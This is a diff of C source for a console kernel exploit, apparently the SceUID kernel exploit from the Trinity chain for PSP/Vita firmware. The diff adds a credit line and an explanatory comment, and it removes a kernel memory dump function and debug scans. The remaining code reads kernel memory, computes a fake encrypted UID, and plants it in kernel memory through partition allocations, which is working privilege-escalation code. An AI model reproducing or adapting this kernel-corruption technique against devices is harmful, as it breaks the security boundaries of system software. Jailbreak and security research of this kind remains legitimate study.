@@ -20,6 +20,7 @@
 SceUID kernel exploit by qwikrazor87.
 Read only kernel exploit by TheFl0w.
 Part of Trinity exploit chain.
+Put toguether by Acid_Snake and meetpatty.
 */
 
 
@@ -86,31 +87,6 @@ u32 readKram(u32 addr){
   return 0;
 }
 
-void dumpKram(){
-    SceUID fd = g_tbl->IoOpen(DUMP_PATH, PSP_O_CREAT | PSP_O_TRUNC | PSP_O_WRONLY, 0777);
-    if (fd < 0){
-        return;
-    }
-    
-    u32 kptr = 0x88000000;
-    u32 size = 0x400000;
-    u32 i;
-    static u32 buf[BUF_SIZE];
-    u32 count = 0;
-    for (i=0; i<size; i+=4){
-        u32 val = readKram((void*)(kptr+i));
-        if (count >= BUF_SIZE){
-            count = 0;
-            g_tbl->IoWrite(fd, buf, sizeof(buf));
-        }
-        buf[count++] = val;
-    }
-    if (count > 0){
-        g_tbl->IoWrite(fd, buf, count*sizeof(u32));
-    }
-    g_tbl->IoClose(fd);
-}
-
 void repairInstruction(KernelFunctions* k_tbl) {
     SceModule2 *mod = k_tbl->KernelFindModuleByName("sceRTC_Service");
     _sw(mod->text_addr + 0x3904, libc_clock_offset);
@@ -142,10 +118,6 @@ FakeUID kxploit
 
 int doExploit(void) {
 
-    //PRTSTR("Dumping kram");
-    //dumpKram();
-    //PRTSTR("kram dumped");
-
     int res;
 
     u32 seed = readKram(SYSMEM_SEED_OFFSET_365);
@@ -159,6 +131,7 @@ int doExploit(void) {
     memset(dummy, 'a', sizeof(dummy));
     SceUID dummyid = g_tbl->KernelAllocPartitionMemory(PSP_MEMORY_PARTITION_USER, dummy, PSP_SMEM_Low, 0x10, NULL);
 
+    // we can calculate the address of dummy block via its UID and from there calculate where the next block will be
     u32 dummyaddr = 0x88000000 + ((dummyid >> 5) & ~3);
     SceUID uid = ((((dummyaddr - FAKE_UID_OFFSET) & 0x00ffffff) >> 2) << 7) | 0x1;
     SceUID encrypted_uid = seed != 0 ? uid ^ seed : uid;
@@ -166,18 +139,6 @@ int doExploit(void) {
     // Plant UID data structure into kernel as string
     u32 string[] = { libc_clock_offset - 4, 0x88888888, 0x88016dc0, encrypted_uid, 0x88888888, 0x10101010, 0, 0 };
     SceUID plantid = g_tbl->KernelAllocPartitionMemory(PSP_MEMORY_PARTITION_USER, (char *)&string, PSP_SMEM_Low, 0x10, NULL);
-
-    /*
-    for (u32 a=0x88010000; a<0x88017000; a+=4){
-        u32 data = readKram(a);
-        if (data == encrypted_uid){
-            PRTSTR1("Found fake uid at: %p", a);
-        }
-        else if (data == 0x61616161){
-            PRTSTR1("Found dummy block at: %p", a);
-        }
-    }
-    */
 
     g_tbl->KernelDcacheWritebackAll();
 
